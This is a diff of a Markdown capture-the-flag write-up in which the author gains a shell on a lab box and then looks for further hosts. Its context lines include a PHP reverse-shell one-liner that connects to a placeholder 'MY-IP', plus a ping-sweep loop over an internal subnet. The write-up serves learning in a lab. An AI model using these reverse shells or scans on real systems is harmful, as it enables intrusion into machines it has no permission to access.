@@ -55,7 +55,8 @@ Still reminding me that this is a box marked as "easy", I tried command injectio
 
 ![PIC_WHOAMI](https://user-images.githubusercontent.com/93183445/141819181-05119d8a-1653-4fed-bb16-85babe95f8df.png)
 
-It took me a few tries just to end up using php and url-encoding anfter I wasn't able to netcat or wget anything.\
+It took me a few tries just to end up using php and url-encoding after I wasn't able to netcat or wget anything.\
+(Should have noticed earlier, because there's a lot of php going on..)\
 Again, https://www.revshells.com to the rescue :)
 
 <code>php -r '$sock=fsockopen("MY-IP",9001);exec("sh <&3 >&3 2>&3");'</code>\
@@ -88,14 +89,14 @@ Trying the same again with this binary, things take an interesting turn:
 
 Welcome to the root-fest :).\
 But no luck, the root directory is pretty much empty..\
-The hostname is "host1", so maybe there's a number2?\
+The hostname is "host1", so maybe there's a number2?
 
 The following just didn't work somehow..
 
 <code>for i in {1..254} ;do (ping -c 1 172.16.20.$i | grep "bytes from" &) ;done</code>
 
 I mean to some degree, because before it went on telling me
-that "Destination Host Unreachable". But inbetween the errors, I saw that 172.16.20.6 was up.\
+that "Destination Host Unreachable", I saw that 172.16.20.6 was up.\
 So I had to stop the loop and reconnect.\
 Note to self: *Better use the static nmap next time..* 
 
